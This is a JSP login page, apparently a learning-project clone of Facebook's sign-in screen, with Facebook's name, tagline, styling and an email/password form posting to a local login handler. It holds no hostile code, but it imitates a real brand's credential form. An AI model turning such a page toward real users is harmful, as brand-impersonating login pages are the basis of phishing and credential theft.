<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>

  <style>
    body{
      margin:0;
      justify-items:center;
    }
    .wrapper{
      display:grid;
      grid-template-columns:1fr 1fr;
      background-color:rgb(240, 240, 240);
      height: 700px;
    }
    .item1{
      align-self: center;
      margin-left:35px;
      margin-right: 20px;
    }
    .item2{
      align-self: center;
      border: 1px solid white;
      border-radius: 7px;
      margin: 2px 2px 2px 35px;
      padding: 30px;
      justify-items: center;
      height: 300px;
      width: 300px;
      font-size: 24px;
      background-color:white;
      box-shadow: -3px -1px 15px 1px rgba(0,0,0,0.44);
      -webkit-box-shadow: -3px -1px 15px 1px rgba(0,0,0,0.44);
      -moz-box-shadow: -3px -1px 15px 1px rgba(0,0,0,0.44);
    }
    .lgform{
      text-align: center;
    }
    #password{
      width: 100%;
      margin:-15px;
      padding: 15px;
      border-radius: 7px;
      border: 1px solid rgb(172, 172, 172);
      justify-self: center;
    }
    #email{
      width: 100%;
      margin:-15px;
      padding: 15px;
      border-radius: 7px;
      border: 1px solid rgb(168, 168, 168);
      justify-self: center;
    }
    #lgbtn{
      margin:-15px;
      width: 330px;
      padding: 15px;
      color:white;
      background-color:blue;
      border-radius: 7px;
      border: 1px solid;
    }
    #cracc{
      width: auto;
      padding: 15px;
      color:white;
      background-color:rgb(4, 170, 32);
      border-radius: 7px;
      border: 1px solid;
      margin-top: 15px;
    }
    .forgetpw{
      justify-content: center;
      margin-left: 3px;
      margin-right: 3px;
      text-align: center;
      margin-bottom:15px;
      font-size: 14px;
      color:rgb(0, 25, 253);
    }
    .fb{
      font-size: 64px;
      font-weight: bold;
      color: rgb(8, 28, 212);
    }
    .text1{
      font-size: 24px;
      margin-top: -25px;
    }
  </style>

</head>
<body>
<div class="wrapper">
  <div class="item item1">
    <div class="fb">facebook</div>
    <div class="text1">
      <p>Facebook helps you connect and share with the people in your life.</p>
    </div>
  </div>
  <div class="item item2">
    <div style="font-size: 15px; padding-bottom: 9px; color: red">
      <c:set var="message" value="${errorMessage}"/>
      <%--            <c:if test="${not empty message}" >--%>
      <h7 id="errorMessage"><c:out value="${message}"/> </h7>
    </div>
    <div class="lgform">

      <form action="login" method="post">
        <input type="text" name="email" id="email" placeholder="Email address or phone number" required><br><br>
        <input type="password" name="password" id="password" placeholder="Password" required><br><br>
        <input type="submit" value="Log in" id="lgbtn"><br><br>
      </form>
      <div class="forgetpw">Forgotten password?</div>
      <a href=${pageContext.request.contextPath}/signup.jsp><input type="submit" value="Create New Account" id="cracc"></a>


    </div>
  </div>

</div>


</body>
</html>